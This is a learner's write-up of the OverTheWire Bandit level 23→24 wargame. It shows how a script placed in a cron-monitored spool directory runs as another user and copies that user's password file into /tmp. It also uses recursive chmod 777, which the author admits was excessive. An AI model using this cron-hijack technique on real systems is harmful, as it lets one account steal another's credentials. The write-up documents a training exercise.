# Bandit Level 23 → 24

## Commands Used

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

ls -ld /var/spool/bandit24/foo
pwd
ls -ld ~

cd /tmp/bandit24_pass
vi script.sh
```

Created the following Bash script:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass/password
```

Made the script executable and allowed the cron job to write to the output directory:

```bash
chmod 777 -R script.sh
chmod 777 -R .
```

Moved the script into the directory monitored by cron:

```bash
mv script.sh /var/spool/bandit24/foo
```

Waited for the scheduled job to execute, then retrieved the password:

```bash
ls
cat password
```

## What I Learned

- Cron can automatically execute scripts under a different user account.
- Bash scripts use `#!/bin/bash` to specify their interpreter.
- The `x` permission allows executable files to run, while on directories it allows traversal.
- A directory requires write and execute permissions to create files inside it.
- `chmod` changes file permissions, and `-R` applies changes recursively.
- `>` redirects standard output into a file.
- A script written by one user can execute with another user's permissions when invoked by a process running as that user.
- Cron jobs that execute user-controlled scripts can introduce security vulnerabilities.

## Difficulties

- Initially investigated the previous level's cron job and attempted to access the protected password file directly.
- Discovered that my home directory was owned by `root`, preventing me from creating scripts there.
- Used `/tmp/bandit24_pass` as a writable workspace.
- Investigated `/var/spool/bandit24/foo` and learned why I could enter the directory but couldn't list its contents.
- Created my first Bash script to copy the Bandit 24 password into a temporary file.
- Used `chmod 777` to provide the required access, although this was more permissive than necessary.
- Moved the script into the monitored directory and waited for cron to execute it.
- Successfully retrieved the Bandit 24 password from the generated output file.
